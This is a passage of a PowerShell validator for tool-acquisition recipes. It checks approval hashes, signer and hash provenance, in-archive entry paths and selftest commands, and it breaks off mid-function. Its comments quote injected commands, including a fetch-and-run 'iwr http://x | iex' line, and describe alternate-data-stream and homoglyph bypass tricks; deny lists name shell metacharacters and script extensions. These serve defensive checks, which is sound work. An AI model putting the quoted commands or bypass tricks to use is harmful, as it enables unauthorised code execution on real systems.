#Requires -Version 5.1
Set-StrictMode -Version Latest

# Capability library primitives. Fully independent of the experience knowledge base: own status machine,
# own validator, own index. Only library-level primitives are reused (ConvertTo-CanonicalJson /
# Get-StringSha256 / Get-Sha256 / Write-Utf8Json / Read-JsonFile / Get-PublicContentFindings /
# Get-PropertyValue). Not one line of the knowledge system is modified.
#
# Two-plane storage (frozen ruling 2026-08-13, exe-selfevo-decision-planes-and-hashsource):
#   declared plane = capabilities/recipes/ in the repo. WHAT WE APPROVED. status: proposed | approved.
#   runtime plane  = machine-local, never committed.   WHAT HAPPENED HERE. status: installed | verified |
#                    quarantined, plus measured hashes and selftest evidence.
# Runtime status in the declared plane is refused outright: that removes the whole "hand-edit
# proposed -> verified" class, because a consumable status cannot exist in a committed file at all.

. (Join-Path $PSScriptRoot 'knowledge-common.ps1')
. (Join-Path $PSScriptRoot 'product-state-common.ps1')

$script:CapabilityDeclaredStatuses = @('proposed', 'approved')
$script:CapabilityRuntimeStatuses = @('installed', 'verified', 'quarantined')
$script:CapabilityStatuses = @($script:CapabilityDeclaredStatuses + $script:CapabilityRuntimeStatuses)
# target-verified is NOT accepted anywhere in phase B/C: a tool-health selftest can never prove a target was
# reproduced, and a badge that claims it must not be settable at all. Per-target evidence stays mandatory.
$script:CapabilityTargetStrengths = @('UNVERIFIED')
# Where the pinned hash came from. tofu_first_measured has no independent anchor (one manual out-of-band
# first fetch) and must never ride the batch auto-approval path -- it is only distinguishable if recorded.
$script:CapabilityHashSources = @('publisher_published', 'gpg_or_sigstore', 'platform_digest', 'tofu_first_measured')
# Batch pre-approval policy per tier (frozen rulings 2026-08-13: planes-and-hashsource ruling 2,
# shape-over-category rulings 6 and 7). Held here, next to the enum, so that a tier can never again be
# added without an adjudicated batch treatment -- the case that made Test-CapabilityBatchEligible
# necessary. Anything not listed below is refused by default; see that function.
$script:CapabilityBatchEligibleHashSources = @('publisher_published', 'platform_digest')
# Eligible ONLY when the verifying key is pinned in the record: an unpinned detached signature proves
# nothing, because whoever can swap the artifact can swap the .sig and the key with it.
$script:CapabilityKeyPinnedHashSources = @('gpg_or_sigstore')
$script:CapabilityPinnedKeyField = 'hash_source_pubkey'
$script:CapabilityArtifactTypes = @('zip', 'exe')
# Fields deliberately kept OUT of the acquire whitelist, each with the reason it must stay out. A bare
# absence is indistinguishable from an oversight: the next person to edit CapabilityAcquireKeys sees a name
# the code reads but the validator rejects and "completes" it -- which here would quietly reopen the batch
# pre-approval path. Registered absences are guarded by the suite; remembered ones are not.
$script:CapabilityDeliberatelyAbsentAcquireKeys = [ordered]@{
    hash_source_pubkey = 'ruling 6 fail-closed: until the pinned verifying key lands in the schema WITH payload coverage, gpg_or_sigstore stays batch-ineligible. Whitelisting it without that work reopens the gate.'
}
$script:CapabilityTopLevelKeys = @('schema_version', 'record_type', 'tool_capability_id', 'status', 'target_strength', 'acquire', 'verify', 'approval', 'payload_sha256', 'created_at', 'updated_at', 'notes')
$script:CapabilityAcquireKeys = @('source_url', 'pinned_version', 'artifact_type', 'expected_sha256', 'hash_source', 'signer', 'unsigned_ack', 'unsigned_reason', 'entry_relpath', 'entry_sha256')
$script:CapabilityVerifyKeys = @('invoke_command', 'expected_output_assert', 'selftest_sample', 'selftest_sample_sha256', 'negative_sample', 'negative_sample_sha256')
$script:CapabilityAssertKeys = @('contains_all', 'not_contains', 'output_sha256')
# Entry-path and invoke-command policy (B1/B4). The extension list is a tripwire, not the control: the
# .exe whitelist already refuses all of them, and this list only exists so the REASON is in the code.
$script:CapabilityForbiddenEntryExtensions = @('.bat', '.cmd', '.ps1', '.psm1', '.vbs', '.js', '.jse', '.wsf', '.wsh', '.hta', '.msi', '.msp', '.jar', '.scr', '.com', '.pif', '.lnk', '.reg', '.cpl', '.url')
$script:CapabilityReservedDeviceNames = @('CON', 'PRN', 'AUX', 'NUL') + (1..9 | ForEach-Object { "COM$_" }) + (1..9 | ForEach-Object { "LPT$_" })
# The only two placeholders an invoke command may carry (frozen by ruling 17). Everything else that could
# start a second command, expand a variable or reach the filesystem by absolute path is refused.
$script:CapabilityInvokeAllowedTokens = @('$env:CAP_TOOL_DIR', '$env:CAP_SAMPLE')
$script:CapabilityInvokeForbiddenChars = @('&', '|', ';', '`', '$', '(', ')', '{', '}', '<', '>', '^', '%', '!', '"', "'", ':')
$script:CapabilityApprovalKeys = @('approved_by', 'approved_at', 'payload_sha256')
$script:CapabilitySignerKeys = @('subject_exact', 'org', 'thumbprint', 'match_policy', 'status', 'timestamped')
$script:CapabilitySignerStatuses = @('Valid', 'UnknownError', 'NotSigned', 'HashMismatch', 'NotTrusted', 'NotSupportedFileFormat', 'Incompatible')
$script:CapabilitySignerMatchPolicies = @('subject_exact', 'org', 'thumbprint')
$script:CapabilitySampleDir = 'fixtures/capabilities/'
# Structured relative-path fields left OUT of the privacy scan (ruling 13). Narrowing what is scanned is
# not the same as allowing a finding type: a real serial anywhere else -- notes above all -- is still
# refused. Each field on this list is already held by other controls (under fixtures/capabilities/, no
# drive letter, no traversal, must exist on disk and hash-match, entry paths additionally shape-checked),
# which is the bar for being here: "another control already covers it", never "this warning is annoying".
$script:CapabilityPrivacyScanSkipFields = @(
    @{ Parent = 'acquire'; Name = 'entry_relpath' },
    @{ Parent = 'verify'; Name = 'selftest_sample' },
    @{ Parent = 'verify'; Name = 'negative_sample' }
)
$script:EmptyFileSha256 = 'E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855'

function Get-CapabilitySignerPayload {
    # Canonical signer sub-payload. Absent/unsigned collapses to a fixed empty shape so the hash is stable.
    param($Signer)
    return [ordered]@{
        subject_exact = [string](Get-PropertyValue $Signer 'subject_exact' '')
        org           = [string](Get-PropertyValue $Signer 'org' '')
        thumbprint    = ([string](Get-PropertyValue $Signer 'thumbprint' '')).ToUpperInvariant()
        match_policy  = [string](Get-PropertyValue $Signer 'match_policy' '')
        status        = [string](Get-PropertyValue $Signer 'status' '')
        timestamped   = [bool](Get-PropertyValue $Signer 'timestamped' $false)
    }
}

function Get-CapabilityPayloadHash {
    # Hash covering EVERY safety-critical field. Any change to the target-strength claim, the acquisition,
    # the integrity anchors, the hash provenance, the signer identity, the invoke command, the selftest
    # predicate, or the sample hashes changes this -> the recorded approval is void and must be re-obtained.
    #
    # status and the runtime evidence are deliberately NOT in here: they advance legitimately over a
    # record's life and folding them in would void an approval on every normal transition. They are held
    # instead by the plane rule (runtime status cannot exist in the declared plane) and by approval, which
    # pins the exact payload a human signed off on.
    #
    # Every read goes through Get-PropertyValue: under StrictMode a structurally incomplete record must
    # still produce a hash (and thus a clean per-record error) instead of throwing and collapsing the run.
    param([Parameter(Mandatory = $true)]$Record)

    $n = ($Record | ConvertTo-Json -Depth 30) | ConvertFrom-Json
    $acquire = Get-PropertyValue $n 'acquire' $null
    $verify = Get-PropertyValue $n 'verify' $null
    $assert = Get-PropertyValue $verify 'expected_output_assert' $null
    $payload = [ordered]@{
        tool_capability_id = [string](Get-PropertyValue $n 'tool_capability_id' '')
        target_strength    = [string](Get-PropertyValue $n 'target_strength' '')
        acquire            = [ordered]@{
            source_url      = [string](Get-PropertyValue $acquire 'source_url' '')
            pinned_version  = [string](Get-PropertyValue $acquire 'pinned_version' '')
            artifact_type   = [string](Get-PropertyValue $acquire 'artifact_type' '')
            expected_sha256 = ([string](Get-PropertyValue $acquire 'expected_sha256' '')).ToUpperInvariant()
            hash_source     = [string](Get-PropertyValue $acquire 'hash_source' '')
            signer          = (Get-CapabilitySignerPayload (Get-PropertyValue $acquire 'signer' $null))
            unsigned_ack    = [bool](Get-PropertyValue $acquire 'unsigned_ack' $false)
            # The reason is part of the unsigned claim, not decoration: it is what a reviewer approved when
            # they accepted an unsigned tool. Leaving it out let the justification be rewritten after
            # approval without voiding it (frozen ruling 12).
            unsigned_reason = [string](Get-PropertyValue $acquire 'unsigned_reason' '')
            entry_relpath   = [string](Get-PropertyValue $acquire 'entry_relpath' '')
            entry_sha256    = ([string](Get-PropertyValue $acquire 'entry_sha256' '')).ToUpperInvariant()
        }
        verify             = [ordered]@{
            invoke_command         = [string](Get-PropertyValue $verify 'invoke_command' '')
            contains_all           = @(@(Get-PropertyValue $assert 'contains_all' @()) | ForEach-Object { [string]$_ } | Sort-Object)
            not_contains           = @(@(Get-PropertyValue $assert 'not_contains' @()) | ForEach-Object { [string]$_ } | Sort-Object)
            output_sha256          = ([string](Get-PropertyValue $assert 'output_sha256' '')).ToUpperInvariant()
            selftest_sample_sha256 = ([string](Get-PropertyValue $verify 'selftest_sample_sha256' '')).ToUpperInvariant()
            negative_sample_sha256 = ([string](Get-PropertyValue $verify 'negative_sample_sha256' '')).ToUpperInvariant()
        }
    }
    return (Get-StringSha256 -Value (ConvertTo-CanonicalJson -Value $payload))
}

function Test-SelftestAssert {
    # Closed machine predicate over a tool's output on the positive sample. Judged here, never by an LLM.
    # Empty output is ALWAYS a fail (a stub that prints nothing cannot pass); at least one positive anchor
    # (contains_all or output_sha256) must be declared or the assert is vacuous.
    param([Parameter(Mandatory = $true)][AllowEmptyString()][string]$Output, [Parameter(Mandatory = $true)]$Assert)

    if ([string]::IsNullOrEmpty($Output)) { return $false }
    $containsAll = @(@(Get-PropertyValue $Assert 'contains_all' @()) | ForEach-Object { [string]$_ } | Where-Object { $_ -ne '' })
    $notContains = @(@(Get-PropertyValue $Assert 'not_contains' @()) | ForEach-Object { [string]$_ } | Where-Object { $_ -ne '' })
    $outputSha = [string](Get-PropertyValue $Assert 'output_sha256' '')
    if ($containsAll.Count -eq 0 -and [string]::IsNullOrWhiteSpace($outputSha)) { return $false }
    foreach ($needle in $containsAll) { if ($Output.IndexOf($needle, [StringComparison]::Ordinal) -lt 0) { return $false } }
    foreach ($needle in $notContains) { if ($Output.IndexOf($needle, [StringComparison]::Ordinal) -ge 0) { return $false } }
    if (-not [string]::IsNullOrWhiteSpace($outputSha)) {
        if ((Get-StringSha256 -Value $Output).ToUpperInvariant() -ne $outputSha.ToUpperInvariant()) { return $false }
    }
    return $true
}

function Test-CapabilitySampleFile {
    # A registered known-answer sample must actually exist under fixtures/capabilities/ and hash to the
    # value recorded in the recipe. Without this the anti-fabrication story is a comment: the recipe could
    # name a file that never existed, or the file could be swapped after the fact to match a tool's output.
    param(
        [Parameter(Mandatory = $true)]$Verify,
        [Parameter(Mandatory = $true)][string]$PathField,
        [Parameter(Mandatory = $true)][string]$HashField,
        [Parameter(Mandatory = $true)][string]$SkillRoot
    )

    $errors = New-Object System.Collections.Generic.List[string]
    $rel = ([string](Get-PropertyValue $Verify $PathField '')).Replace('\', '/')
    $declared = ([string](Get-PropertyValue $Verify $HashField '')).ToUpperInvariant()
    if ([string]::IsNullOrWhiteSpace($rel)) { [void]$errors.Add("verify.$PathField required"); return $errors }
    if ($rel -match '(^[A-Za-z]:)|(^/)|(\.\.)') {
        [void]$errors.Add("verify.$PathField must be a relative in-repo path (no drive/abs/parent): $rel")
        return $errors
    }
    if (-not $rel.StartsWith($script:CapabilitySampleDir, [StringComparison]::Ordinal)) {
        [void]$errors.Add("verify.$PathField must live under $script:CapabilitySampleDir : $rel")
        return $errors
    }
    $full = Join-Path $SkillRoot ($rel -replace '/', [IO.Path]::DirectorySeparatorChar)
    if (-not (Test-Path -LiteralPath $full -PathType Leaf)) {
        [void]$errors.Add("verify.$PathField points at a file that does not exist: $rel")
        return $errors
    }
    $actual = (Get-Sha256 -Path $full).ToUpperInvariant()
    if ($actual -eq $script:EmptyFileSha256) { [void]$errors.Add("verify.$PathField is a 0-byte file (not a known-answer sample): $rel") }
    if ($declared -ne $actual) { [void]$errors.Add("verify.$HashField does not match the file on disk (sample tampered or hash stale): $rel") }
    return $errors
}

function Test-CapabilityRecord {
    # Default-deny validation of one DECLARED-plane recipe. Returns human-readable error strings ([] == valid).
    # -SkillRoot enables the on-disk known-answer sample checks (skipped only when the caller has no root).
    param(
        [Parameter(Mandatory = $true)]$Record,
        [string]$SkillRoot = ''
    )

    # Normalize hashtable OR PSCustomObject input to a uniform PSCustomObject, so .PSObject.Properties and
    # Get-PropertyValue behave identically whether the recipe is in-memory or read from disk.
    $Record = ($Record | ConvertTo-Json -Depth 30) | ConvertFrom-Json
    $errors = New-Object System.Collections.Generic.List[string]
    $add = { param($m) [void]$errors.Add([string]$m) }

    foreach ($p in $Record.PSObject.Properties) {
        if ($script:CapabilityTopLevelKeys -notcontains $p.Name) { & $add "unknown top-level field: $($p.Name)" }
    }
    if ([string](Get-PropertyValue $Record 'schema_version' '') -ne '1' -and (Get-PropertyValue $Record 'schema_version' 0) -ne 1) { & $add 'schema_version must be 1' }
    if ([string](Get-PropertyValue $Record 'record_type' '') -ne 'capability_recipe') { & $add 'record_type must be capability_recipe' }
    $capId = [string](Get-PropertyValue $Record 'tool_capability_id' '')
    if ($capId -notmatch '^[a-z0-9]+(\.[a-z0-9]+)+$') { & $add "tool_capability_id malformed: $capId" }

    # Plane rule. A committed recipe declares what we approved; it can never assert what happened on a
    # machine. installed/verified/quarantined belong to the machine-local runtime plane, so a hand-edited
    # proposed -> verified (or a quarantined record revived to verified) is refused here by construction.
    $status = [string](Get-PropertyValue $Record 'status' '')
    if ($script:CapabilityRuntimeStatuses -contains $status) {
        & $add "status=$status is a runtime fact and must not appear in the declared plane (capabilities/recipes/); the declared plane accepts only: $($script:CapabilityDeclaredStatuses -join ' | ')"
    }
    elseif ($script:CapabilityDeclaredStatuses -notcontains $status) { & $add "unknown status: $status" }

    $strength = [string](Get-PropertyValue $Record 'target_strength' '')
    if ($script:CapabilityTargetStrengths -notcontains $strength) {
        & $add "target_strength must be UNVERIFIED (a tool-health selftest can never establish that a target was reproduced): $strength"
    }

    $acquire = Get-PropertyValue $Record 'acquire' $null
    if ($null -eq $acquire) { & $add 'missing acquire block' }
    else {
        foreach ($p in $acquire.PSObject.Properties) { if ($script:CapabilityAcquireKeys -notcontains $p.Name) { & $add "unknown acquire field: $($p.Name)" } }
        $url = [string](Get-PropertyValue $acquire 'source_url' '')
        if ($url -notmatch '^https://[^@?#]+$') { & $add "acquire.source_url must be HTTPS with no userinfo/query: $url" }
        if ([string]::IsNullOrWhiteSpace([string](Get-PropertyValue $acquire 'pinned_version' ''))) { & $add 'acquire.pinned_version required' }
        $artifactType = [string](Get-PropertyValue $acquire 'artifact_type' '')
        if ($script:CapabilityArtifactTypes -notcontains $artifactType) { & $add ('acquire.artifact_type must be ' + ($script:CapabilityArtifactTypes -join '|')) }
        foreach ($h in @('expected_sha256', 'entry_sha256')) {
            $hv = [string](Get-PropertyValue $acquire $h '')
            if ($hv -notmatch '^[A-Fa-f0-9]{64}$') { & $add "acquire.$h must be 64 hex (integrity anchor missing/malformed)" }
            elseif ($hv.ToUpperInvariant() -eq $script:EmptyFileSha256) { & $add "acquire.$h is the empty-file hash (no real artifact)" }
        }
        $entry = [string](Get-PropertyValue $acquire 'entry_relpath' '')
        foreach ($m in (Test-CapabilityEntryPath -EntryRelPath $entry)) { & $add $m }

        # Hash provenance. Without this a hash we measured ourselves once, with nothing to compare against,
        # is byte-identical in the library to one the publisher published -- and the batch auto-approval
        # path would treat them as equally trustworthy.
        $hashSource = [string](Get-PropertyValue $acquire 'hash_source' '')
        if ($script:CapabilityHashSources -notcontains $hashSource) { & $add "acquire.hash_source must be one of: $($script:CapabilityHashSources -join ' | ')" }

        $unsignedAck = [bool](Get-PropertyValue $acquire 'unsigned_ack' $false)
        $signer = Get-PropertyValue $acquire 'signer' $null
        $hasSigner = ($null -ne $signer -and @($signer.PSObject.Properties).Count -gt 0)
        # Exactly one of the two. "Signed by Microsoft" AND "acknowledged unsigned" is a contradictory
        # claim that a human reviewer would have to resolve, so it may not enter the library at all.
        if ($hasSigner -and $unsignedAck) { & $add 'acquire must declare exactly one of signer / unsigned_ack=true, not both (contradictory provenance claim)' }
        elseif (-not $hasSigner -and -not $unsignedAck) { & $add 'acquire must declare exactly one of signer / unsigned_ack=true (an unsigned tool needs unsigned_ack + unsigned_reason)' }

        if ($unsignedAck) {
            if ([string]::IsNullOrWhiteSpace([string](Get-PropertyValue $acquire 'unsigned_reason' ''))) { & $add 'acquire.unsigned_ack=true requires unsigned_reason' }
        }
        if ($hasSigner) {
            foreach ($p in $signer.PSObject.Properties) { if ($script:CapabilitySignerKeys -notcontains $p.Name) { & $add "unknown acquire.signer field: $($p.Name)" } }
            $sStatus = [string](Get-PropertyValue $signer 'status' '')
            if ($script:CapabilitySignerStatuses -notcontains $sStatus) { & $add "acquire.signer.status must be one of: $($script:CapabilitySignerStatuses -join ' | ')" }
            $policy = [string](Get-PropertyValue $signer 'match_policy' '')
            if ($script:CapabilitySignerMatchPolicies -notcontains $policy) { & $add "acquire.signer.match_policy must be one of: $($script:CapabilitySignerMatchPolicies -join ' | ')" }
            $thumb = [string](Get-PropertyValue $signer 'thumbprint' '')
            if ($policy -eq 'thumbprint' -and $thumb -notmatch '^[A-Fa-f0-9]{40,64}$') { & $add 'acquire.signer.match_policy=thumbprint requires a hex thumbprint' }
            if ($policy -eq 'subject_exact' -and [string]::IsNullOrWhiteSpace([string](Get-PropertyValue $signer 'subject_exact' ''))) { & $add 'acquire.signer.match_policy=subject_exact requires subject_exact' }
            if ($policy -eq 'org' -and [string]::IsNullOrWhiteSpace([string](Get-PropertyValue $signer 'org' ''))) { & $add 'acquire.signer.match_policy=org requires org' }
            if ($null -eq (Get-PropertyValue $signer 'timestamped' $null)) { & $add 'acquire.signer.timestamped required (an untimestamped signature on a pinned old version expires)' }
            # A hash we measured ourselves on first use is the weakest anchor there is; pairing it with a
            # signature claim would let it inherit the signature's credibility on the auto path.
            if ($hashSource -eq 'tofu_first_measured') { & $add 'acquire.hash_source=tofu_first_measured must not be combined with a signer (trust-on-first-use may never inherit signature credibility)' }
        }
    }

    $verify = Get-PropertyValue $Record 'verify' $null
    if ($null -eq $verify) { & $add 'missing verify block' }
    else {
        foreach ($p in $verify.PSObject.Properties) { if ($script:CapabilityVerifyKeys -notcontains $p.Name) { & $add "unknown verify field: $($p.Name)" } }
        $invoke = [string](Get-PropertyValue $verify 'invoke_command' '')
        foreach ($m in (Test-CapabilityInvokeCommand -InvokeCommand $invoke)) { & $add $m }
        $assert = Get-PropertyValue $verify 'expected_output_assert' $null
        if ($null -eq $assert) { & $add 'verify.expected_output_assert required' }
        else {
            # Default-deny here too. The schema has always declared this node additionalProperties:false,
            # but nothing enforced it, so an unknown key next to a real assert was accepted in silence --
            # exactly the "schema states a rule no code applies" shape ruling 10 forbids.
            foreach ($p in $assert.PSObject.Properties) { if ($script:CapabilityAssertKeys -notcontains $p.Name) { & $add "unknown expected_output_assert field: $($p.Name)" } }
            $ca = @(@(Get-PropertyValue $assert 'contains_all' @()) | Where-Object { -not [string]::IsNullOrWhiteSpace([string]$_) })
            $os = [string](Get-PropertyValue $assert 'output_sha256' '')
            if ($ca.Count -eq 0 -and [string]::IsNullOrWhiteSpace($os)) { & $add 'verify.expected_output_assert needs at least one positive anchor (contains_all or output_sha256)' }
        }
        if ([string]::IsNullOrWhiteSpace([string](Get-PropertyValue $verify 'negative_sample' ''))) { & $add 'verify.negative_sample required (a stub that always answers must fail it)' }
        foreach ($h in @('selftest_sample_sha256', 'negative_sample_sha256')) {
            if ([string](Get-PropertyValue $verify $h '') -notmatch '^[A-Fa-f0-9]{64}$') { & $add "verify.$h must be 64 hex" }
        }
        if (-not [string]::IsNullOrWhiteSpace($SkillRoot)) {
            foreach ($e in (Test-CapabilitySampleFile -Verify $verify -PathField 'selftest_sample' -HashField 'selftest_sample_sha256' -SkillRoot $SkillRoot)) { & $add $e }
            foreach ($e in (Test-CapabilitySampleFile -Verify $verify -PathField 'negative_sample' -HashField 'negative_sample_sha256' -SkillRoot $SkillRoot)) { & $add $e }
        }
    }

    # Integrity: payload_sha256 must equal the hash recomputed from the safety-critical fields. A changed
    # safety field that did not recompute the hash (or a tampered hash) is refused -- stale invalidation.
    $declared = [string](Get-PropertyValue $Record 'payload_sha256' '')
    $recomputed = ''
    if ($declared -notmatch '^[A-Fa-f0-9]{64}$') { & $add 'payload_sha256 missing/malformed' }
    else {
        $recomputed = Get-CapabilityPayloadHash -Record $Record
        if ($declared.ToUpperInvariant() -ne $recomputed.ToUpperInvariant()) { & $add 'payload_sha256 does not match the safety-critical fields (tampered or stale approval)' }
    }

    # Approval is what makes payload_sha256 an approval anchor rather than a mere checksum: it records
    # WHICH payload a human signed off on. Recompute-and-move-on is exactly the bypass this closes -- an
    # editor who changes a safety field and dutifully refreshes payload_sha256 still invalidates approval.
    $approval = Get-PropertyValue $Record 'approval' $null
    if ($status -eq 'approved') {
        if ($null -eq $approval) { & $add 'status=approved requires an approval block {approved_by, approved_at, payload_sha256}' }
        else {
            foreach ($p in $approval.PSObject.Properties) { if ($script:CapabilityApprovalKeys -notcontains $p.Name) { & $add "unknown approval field: $($p.Name)" } }
            if ([string]::IsNullOrWhiteSpace([string](Get-PropertyValue $approval 'approved_by' ''))) { & $add 'approval.approved_by required' }
            if ([string]::IsNullOrWhiteSpace([string](Get-PropertyValue $approval 'approved_at' ''))) { & $add 'approval.approved_at required' }
            $ap = ([string](Get-PropertyValue $approval 'payload_sha256' '')).ToUpperInvariant()
            if ($ap -notmatch '^[A-F0-9]{64}$') { & $add 'approval.payload_sha256 missing/malformed' }
            elseif ($recomputed -ne '' -and $ap -ne $recomputed.ToUpperInvariant()) { & $add 'approval belongs to an older payload (a safety field changed after approval; re-approval required)' }
        }
    }
    elseif ($null -ne $approval) { & $add "status=$status must not carry an approval block (only an approved record has been approved)" }

    # Privacy: scan the WHOLE canonical record every time (per the build plan). But a recipe LEGITIMATELY
    # carries a download URL and integrity hashes -- those are its purpose, not a leak -- so ignore the
    # url/artifact_hash finding types and keep the real leaks: absolute local paths (the §9 concern),
    # token/userinfo in URLs, product identity, etc. source_url format (HTTPS, no userinfo/query) is
    # separately enforced above.
    # Ruling 13: the serial-number rule ("3-6 hyphen-separated groups of 4-8 characters") reads the most
    # natural release-tree and fixture names as licence keys -- dnspy-net8-win64/dnSpy.Console.exe is a real
    # draft entry path and is measured as a license_serial hit. The fix is to scan LESS, not to allow the
    # finding type: the three structured path fields are dropped from the scanned copy and everything else,
    # notes included, is still scanned in full. The shared knowledge-base rule itself is untouched.
    $recipeAllowedFindings = @('url', 'domain_name', 'artifact_hash')
    $scanRecord = ($Record | ConvertTo-Json -Depth 30) | ConvertFrom-Json
    foreach ($skip in $script:CapabilityPrivacyScanSkipFields) {
        $parent = Get-PropertyValue $scanRecord $skip.Parent $null
        if ($null -ne $parent -and @($parent.PSObject.Properties.Name) -contains $skip.Name) { $parent.PSObject.Properties.Remove($skip.Name) }
    }
    $findings = @(Get-PublicContentFindings -Text (ConvertTo-CanonicalJson -Value $scanRecord) | Where-Object { $_ -notin $recipeAllowedFindings })
    foreach ($f in ($findings | Select-Object -Unique)) { & $add "privacy finding in recipe: $f" }

    return $errors
}

function Test-CapabilityEntryPath {
    # WHICH file inside the fetched artifact gets executed. Decision A's security kernel never runs an
    # installer or an in-package script, and until now nothing enforced that: the single shape check
    # accepted setup/install.bat as readily as upx.exe. Pure predicate -- no IO, returns the reasons.
    #
    # The colon is banned twice on purpose (E2's character set and E3's own rule). 'setup.bat:payload.exe'
    # ends in .exe yet names an NTFS alternate data stream hanging off setup.bat, so the file actually
    # touched is setup.bat: an extension check must never be the last thing standing between us and that
    # string. Two independent bans mean removing either one alone still leaves it refused.
    param([Parameter(Mandatory = $true)][AllowEmptyString()][string]$EntryRelPath)

    $errors = New-Object System.Collections.Generic.List[string]
    $e = [string]$EntryRelPath

    # E0 -- present at all.
    if ([string]::IsNullOrWhiteSpace($e)) {
        [void]$errors.Add('acquire.entry_relpath is required')
        return $errors.ToArray()
    }

    # E1 -- no leading/trailing whitespace. Deliberately refused rather than trimmed: approval is
    # byte-exact, and 'upx.exe ' and 'upx.exe' are indistinguishable to a human reading the diff.
    if ($e -cne $e.Trim()) { [void]$errors.Add("acquire.entry_relpath has leading or trailing whitespace (Windows silently strips it; an approved recipe is byte-exact): '$e'") }

    # E2 -- character whitelist. Non-ASCII is refused outright because of homoglyphs: '.ехе' with a
    # Cyrillic 'е' is pixel-identical to '.exe'. '+' has to stay allowed -- a real draft entry is
    # jdk-21.0.12+8/bin/java.exe.
    if ($e -match '[^A-Za-z0-9._+~() \\/-]') { [void]$errors.Add("acquire.entry_relpath contains a character that is not allowed in an in-archive path (control, non-ASCII or wildcard): '$e'") }

    # E3 -- no colon anywhere. In-archive relative paths never need one, so this costs nothing and takes
    # out both the ADS syntax and drive-qualified paths.
    if ($e.Contains(':')) { [void]$errors.Add("acquire.entry_relpath must not contain ':' (NTFS alternate data stream or drive-qualified path): '$e'") }

    # E4a -- whole-string '..' match, KNOWN TO BE OVER-STRICT AND KEPT THAT WAY (coordinator ruling
    # 2026-08-13). Per-segment checking is more precise, but it turns a refusal into an acceptance, and the
    # measured gain is zero: all ten real drafts use plain names, none looks like 'v1..2/upx.exe'. A
    # substring match refuses a superset of the real set -- it can only over-refuse, never under-refuse,
    # and that is the direction of error we can absorb. This is NOT the "a gate with false positives is
    # worse than no gate" case: that rule is about false-positive rates high enough to make the next person
    # switch the door off (the privacy scan was rejecting nine of ten), and here the measured rate is zero.
    # To reopen: bring a REAL published artifact whose in-archive path contains '..'; constructed strings
    # do not count. Loosening this into per-segment turns CE49-E27 red, which is the point.
    if ($e.Contains('..')) { [void]$errors.Add("acquire.entry_relpath must be a relative in-archive path (no drive/abs/parent): '$e'") }

    # E4b -- per-segment checks, ADDED ON TOP of E4a rather than replacing it.
    foreach ($seg in $e.Split(@('/', '\'))) {
        $bad = ''
        if ($seg -eq '') { $bad = 'empty' }
        elseif ($seg -eq '.') { $bad = "'.'" }
        elseif ($seg.EndsWith(' ') -or $seg.EndsWith('.')) { $bad = 'trailing space or dot' }
        else {
            $stem = $seg
            $dot = $stem.IndexOf('.')
            if ($dot -ge 0) { $stem = $stem.Substring(0, $dot) }
            # Reserved device names are a zero-cost hardening in the over-strict direction. Their actual
            # damage on the extract/execute chain is NOT demonstrated here -- do not write this up as a
            # verified attack surface.
            if ($script:CapabilityReservedDeviceNames -contains $stem.ToUpperInvariant()) { $bad = 'a reserved device name' }
        }
        if ($bad -ne '') { [void]$errors.Add("acquire.entry_relpath has an invalid path segment ($bad): '$seg' in '$e'") }
    }

    # E5 -- no drive letter, no absolute path, no UNC. E3 already makes the first unreachable; both stay,
    # fail-closed.
    if ($e -match '(^[A-Za-z]:)|(^[\\/])') { [void]$errors.Add("acquire.entry_relpath must be a relative in-archive path (no drive letter, absolute path or UNC): '$e'") }

    # E6/E7 -- the entry has to be an .exe. Case-insensitive (the publisher owns the file's casing);
    # 'upx.exe.bat' dies here because only the LAST four characters are looked at; the length test refuses
    # a bare '.exe' with no stem. [IO.Path]::GetExtension() is avoided on purpose -- it has thrown on
    # strings containing invalid characters on older .NET, and E2 has already narrowed the character set.
    $segments = @($e.Split(@('/', '\')))
    $last = $segments[$segments.Count - 1]
    if (-not ($last.Length -gt 4 -and $last.ToLowerInvariant().EndsWith('.exe'))) {
        $known = @($script:CapabilityForbiddenEntryExtensions | Where-Object { $last.ToLowerInvariant().EndsWith($_) })
        if ($known.Count -gt 0) {
            # E6's whitelist already refused this. E7 exists only to keep the REASON in the code, so the
            # next reader does not see a rejected .bat and conclude the validator is being obtuse.
            [void]$errors.Add("acquire.entry_relpath points at an installer or script ($($known[0])); decision A's security kernel forbids executing installers or in-package scripts. A tool with no .exe entry point goes through manual out-of-band review, not this recipe: '$e'")
        }
        else {
            [void]$errors.Add("acquire.entry_relpath must point at an .exe (the security kernel never executes installers or in-package scripts): '$e'")
        }
    }

    return $errors.ToArray()
}

function Test-CapabilityInvokeCommand {
    # The selftest command line. It used to be a free string, so '& calc.exe' or '; iwr http://x | iex'
    # rode straight through -- the same "free command" entrance decision A threw off the auto path.
    # Pure predicate; returns the reasons.
    #
    # Ruling 17 froze exactly two placeholders for the tool and sample locations, so those (and only
    # those) may carry the '$' and ':' that are otherwise refused. They are removed from a working copy
    # first, which also means a string that merely LOOKS like one ('$en' + token + 'v:OTHER') still has a
    # bare '$' left over and is refused.
    param([Parameter(Mandatory = $true)][AllowEmptyString()][string]$InvokeCommand)

    $errors = New-Object System.Collections.Generic.List[string]
    $cmd = [string]$InvokeCommand
    if ([string]::IsNullOrWhiteSpace($cmd)) {
        [void]$errors.Add('verify.invoke_command required')
        return $errors.ToArray()
    }
    if ($cmd -match '[^\x20-\x7E]') { [void]$errors.Add("verify.invoke_command must not contain control or non-ASCII characters: '$cmd'") }
    if ($cmd -match '(^|[^A-Za-z0-9])[A-Za-z]:[\\/]') { [void]$errors.Add('verify.invoke_command must not use an absolute path') }

    $residue = $cmd
    foreach ($token in $script:CapabilityInvokeAllowedTokens) { $residue = [regex]::Replace($residue, [regex]::Escape($token), ' ', 'IgnoreCase') }
    foreach ($ch in $script:CapabilityInvokeForbiddenChars) {
        if ($residue.Contains($ch)) {
            [void]$errors.Add("verify.invoke_command must not contain the shell metacharacter '$ch' (chaining a second command must be impossible; use $($script:CapabilityInvokeAllowedTokens -join ' / ') for paths): '$cmd'")
        }
    }
    return $errors.ToArray()
}

function Test-CapabilityConsumable {
    # Whether a recipe may actually be USED to invoke a tool. Consumption requires a RUNTIME-plane record
    # at status=verified backed by selftest evidence. A declared-plane recipe -- proposed or approved --
    # is never consumable, so nothing in the repo can be turned into "usable" by editing a file.
    # The runtime plane lands with the acquire gate; until then this is fail-closed by construction.
    param([Parameter(Mandatory = $true)]$Record)

    $Record = ($Record | ConvertTo-Json -Depth 30) | ConvertFrom-Json
    $status = [string](Get-PropertyValue $Record 'status' '')
